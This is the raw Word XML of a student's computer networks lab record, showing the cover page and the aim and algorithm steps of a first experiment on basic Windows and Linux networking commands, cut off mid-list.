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C7D72" w14:textId="77777777" w:rsidR="00321D34" w:rsidRDefault="00321D34" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38B8A127" w14:textId="77777777" w:rsidR="00321D34" w:rsidRDefault="00321D34" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B0F1451" w14:textId="11CF8E92" w:rsidR="00321D34" w:rsidRPr="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="007B4ECD">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B4ECD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>COMPUTER NETWORKS EXPERIMENTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05481FE5" w14:textId="77777777" w:rsidR="00321D34" w:rsidRDefault="00321D34" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FDC3E93" w14:textId="182CE182" w:rsidR="00321D34" w:rsidRDefault="007B4ECD" w:rsidP="007B4ECD">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">                     </w:t>
      </w:r>
      <w:r w:rsidR="00321D34">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>NAME: APARNA K A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD883E0" w14:textId="75A49BC3" w:rsidR="00321D34" w:rsidRDefault="007B4ECD" w:rsidP="007B4ECD">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">                     </w:t>
      </w:r>
      <w:r w:rsidR="00321D34">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ROLL.NO: 251901016</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15939020" w14:textId="08C84E9A" w:rsidR="00321D34" w:rsidRDefault="007B4ECD" w:rsidP="007B4ECD">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">                     </w:t>
      </w:r>
      <w:r w:rsidR="00321D34">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>DEPARTMENT: CSE-CS (Cybersecurity)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370029DE" w14:textId="1F707132" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="007B4ECD">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">                     SECTION: A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C58A385" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DEEA901" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25182308" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12CDD3F6" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C3273AC" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49976583" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FE0720A" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69C3AC91" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70B8E1EB" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0224DC6F" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55A94B5B" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19556C21" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19E16C3D" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04A0CFE8" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51953841" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D664500" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B13EBB5" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30017C16" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="227B12D9" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F704EFA" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2898BD8F" w14:textId="77777777" w:rsidR="007B4ECD" w:rsidRDefault="007B4ECD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C4189EF" w14:textId="0D306B5D" w:rsidR="007104CD" w:rsidRPr="00321D34" w:rsidRDefault="004967CD" w:rsidP="00321D34">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Ex.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>No:1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B090C2" w14:textId="6B8521C7" w:rsidR="004967CD" w:rsidRPr="004967CD" w:rsidRDefault="004967CD" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BASIC NETWORKING COMMANDS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4066FEE0" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76604474" w14:textId="03DE780A" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Aim</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662F15BE" w14:textId="77777777" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>To study and execute basic networking commands in Windows and Linux operating systems for viewing network configuration, checking connectivity, and performing basic network troubleshooting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7A2D96"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Algorithm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7933C861" w14:textId="15BBF271" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Start the Windows operating system and Ubuntu Linux operating system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529B18DD" w14:textId="665088B4" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Command Prompt</w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in Windows and </w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Terminal</w:t>
      </w:r>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2315B838" w14:textId="3A994F50" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Execute the basic networking commands one by one.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1348FF55" w14:textId="26847573" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Observe the network configuration and connectivity information displayed by each command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72782230" w14:textId="429A77E5" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004967CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Compare the commands available in Windows and Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C48221" w14:textId="3AF67218" w:rsidR="007104CD" w:rsidRPr="004967CD" w:rsidRDefault="007104CD" w:rsidP="00303157">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
